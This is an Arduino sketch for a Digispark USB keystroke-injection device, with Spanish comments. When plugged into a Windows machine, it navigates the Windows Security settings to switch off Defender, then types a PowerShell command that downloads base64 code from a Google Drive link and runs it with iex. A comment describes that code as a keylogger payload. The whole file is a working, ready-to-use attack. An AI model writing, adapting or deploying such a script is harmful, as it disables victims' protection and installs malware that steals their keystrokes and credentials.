#include "DigiKeyboard.h"

#define KEY_TAB 0x2B  // No está definido en la librería legacy, se añade manualmente

// ---------------------------------------------------------------------------
// Scancodes HID
// ---------------------------------------------------------------------------
#define SC_1        0x1E
#define SC_2        0x1F
#define SC_3        0x20
#define SC_4        0x21
#define SC_5        0x22
#define SC_6        0x23
#define SC_7        0x24
#define SC_8        0x25
#define SC_9        0x26
#define SC_0        0x27
#define SC_MINUS    0x2D
#define SC_EQUAL    0x2E
#define SC_LBRACKET 0x2F
#define SC_RBRACKET 0x30
#define SC_QUOTE    0x34
#define SC_COMMA    0x36
#define SC_PERIOD   0x37
#define SC_SLASH    0x38

// Modificadores
#define MOD_LCTRL   0x01
#define MOD_LSHIFT  0x02
#define MOD_LALT    0x04

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------
void t_shift(int sc)       { DigiKeyboard.sendKeyStroke(sc, MOD_LSHIFT);           DigiKeyboard.delay(90); }
void t_altgr(int sc)       { DigiKeyboard.sendKeyStroke(sc, MOD_LALT | MOD_LCTRL); DigiKeyboard.delay(90); }
void t_plain(int sc)       { DigiKeyboard.sendKeyStroke(sc);                       DigiKeyboard.delay(90); }
void t_print(const char*s) { DigiKeyboard.print(s);                                DigiKeyboard.delay(90); }

// Emisores de caracteres concretos
void out_dquote()      { t_shift(SC_2); }               // "
void out_squote()      { t_plain(SC_MINUS); }           // '
void out_colon()       { t_shift(SC_PERIOD); }          // :
void out_slash()       { t_shift(SC_7); }               // /
void out_lparen()      { t_shift(SC_8); DigiKeyboard.delay(60); }  // (
void out_rparen()      { t_shift(SC_9); DigiKeyboard.delay(60); }  // )
void out_equal()       { t_shift(SC_0); }               // =
void out_lbrack()      { t_altgr(SC_LBRACKET); }        // [
void out_rbrack()      { t_altgr(SC_RBRACKET); }        // ]
void out_question()    { t_shift(SC_MINUS); }           // ?
void out_amp()         { t_shift(SC_6); }               // &
void out_minus()       { t_plain(SC_SLASH); }           // -
void out_dot()         { t_print("."); }                // .

void setup() {
  DigiKeyboard.delay(5000); // Delay inicial obligatorio en Digispark

  // Windows Defender (DESACTIVAR)
  DigiKeyboard.sendKeyStroke(KEY_S, MOD_GUI_LEFT); // GUI s
  DigiKeyboard.delay(800);

  DigiKeyboard.print("seguridad"); // STRING seguridad
  DigiKeyboard.delay(800);

  DigiKeyboard.sendKeyStroke(KEY_ENTER); // ENTER
  DigiKeyboard.delay(4000);

  DigiKeyboard.sendKeyStroke(KEY_ENTER); // ENTER
  DigiKeyboard.delay(2000);

  DigiKeyboard.sendKeyStroke(KEY_TAB); // TAB
  DigiKeyboard.sendKeyStroke(KEY_TAB); // TAB
  DigiKeyboard.sendKeyStroke(KEY_TAB); // TAB
  DigiKeyboard.sendKeyStroke(KEY_TAB); // TAB
  DigiKeyboard.delay(2000);

  DigiKeyboard.sendKeyStroke(KEY_ENTER); // ENTER
  DigiKeyboard.delay(2000);

  DigiKeyboard.sendKeyStroke(KEY_SPACE); // SPACE
  DigiKeyboard.delay(2000);

  DigiKeyboard.sendKeyStroke(KEY_TAB); // TAB
  DigiKeyboard.sendKeyStroke(KEY_TAB); // TAB
  DigiKeyboard.delay(800);

  DigiKeyboard.sendKeyStroke(KEY_ENTER); // ENTER
  DigiKeyboard.delay(1000);

  // DESCARGARSE PAYLOAD DE KEYLOGGER (VPS)
  // Win+R
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  // =========================================================================
  // Comando completo, carácter por carácter
  // =========================================================================
  // powershell -Command "
  t_print("powershell ");
  out_minus();                    // -
  t_print("Command ");
  out_dquote();                   // "

  // iex (
  t_print("iex ");
  out_lparen();                   // (

  // [System.Text.Encoding]
  out_lbrack();
  t_print("System");
  out_dot();
  t_print("Text");
  out_dot();
  t_print("Encoding");
  out_rbrack();

  // ::
  out_colon();
  out_colon();

  // Unicode.GetString(
  t_print("Unicode");
  out_dot();
  t_print("GetString");
  out_lparen();                   // (

  // [System.Convert]
  out_lbrack();
  t_print("System");
  out_dot();
  t_print("Convert");
  out_rbrack();

  // ::
  out_colon();
  out_colon();

  // FromBase64String((
  t_print("FromBase64String");
  out_lparen();
  DigiKeyboard.delay(200);
  out_lparen();                   // abre el "(" exterior del UTF8.GetString(...)
  DigiKeyboard.delay(200);

  // [System.Text.Encoding]
  out_lbrack();
  t_print("System");
  out_dot();
  t_print("Text");
  out_dot();
  t_print("Encoding");
  out_rbrack();

  // ::
  out_colon();
  out_colon();

  // UTF8.GetString(  ← NUEVO
  t_print("UTF8");
  out_dot();
  t_print("GetString");
  out_lparen();                   // (
  DigiKeyboard.delay(150);

  // (iwr -UseBasicParsing 'https://drive.google.com/...')
  out_lparen();                   // (
  DigiKeyboard.delay(150);

  t_print("iwr ");
  out_minus();
  t_print("UseBasicParsing ");
  out_squote();                   // '
  DigiKeyboard.delay(100);

  t_print("https");
  out_colon();
  out_slash();
  DigiKeyboard.delay(100);
  out_slash();
  t_print("drive");
  out_dot();
  t_print("google");
  out_dot();
  t_print("com");
  out_slash();
  t_print("uc");
  out_question();
  t_print("export");
  out_equal();
  t_print("download");
  out_amp();
  t_print("id");
  out_equal();
  t_print("<ID_Drive>");

  out_squote();                   // '
  DigiKeyboard.delay(100);

  // ).Content).Trim()))))
  out_rparen();                   // )   cierra el (iwr ... )
  DigiKeyboard.delay(200);
  out_dot();
  t_print("Content");
  out_rparen();                   // )   cierra el (...iwr...).Content
  DigiKeyboard.delay(200);
  out_dot();
  t_print("Trim");
  out_lparen();                   // (
  DigiKeyboard.delay(250);
  out_rparen();                   // )
  DigiKeyboard.delay(250);
  out_rparen();                   // )   cierra UTF8.GetString(
  DigiKeyboard.delay(250);
  out_rparen();                   // )   cierra FromBase64String(
  DigiKeyboard.delay(250);
  out_rparen();                   // )   cierra Unicode.GetString(
  DigiKeyboard.delay(250);
  out_rparen();                   // )   cierra iex (
  DigiKeyboard.delay(250);

  // "
  out_dquote();                   // "
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // ENTER
  DigiKeyboard.delay(15000);

  DigiKeyboard.print("exit"); // salir del powershell
  DigiKeyboard.delay(1000);

  //DigiKeyboard.sendKeyStroke(KEY_ENTER); // ENTER
  DigiKeyboard.delay(1000);

  // CERRAR LO ANTERIOR
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); // ALT+F4 (Cerrar ventana seguridad de windows)
  DigiKeyboard.delay(1000);
}

void loop() {
  // No se repite nada
}